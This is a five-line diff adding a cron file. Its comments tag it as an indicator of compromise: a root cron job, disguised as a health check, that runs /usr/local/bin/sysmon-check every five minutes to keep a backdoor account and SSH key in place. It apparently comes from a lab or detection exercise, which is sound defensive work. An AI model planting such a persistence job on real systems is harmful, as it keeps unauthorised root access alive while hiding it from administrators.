@@ -1,0 +1,5 @@
+# IOC:PERSISTENCE-CRON -- disguised as a routine health check; actually
+# re-runs /usr/local/bin/sysmon-check (IOC:PERSISTENCE-SCRIPT) every 5
+# minutes as root, which is what makes the backdoor account/SSH key
+# self-healing rather than a one-time plant.
+*/5 * * * * root /usr/local/bin/sysmon-check >> /var/log/sysmon-check.log 2>&1
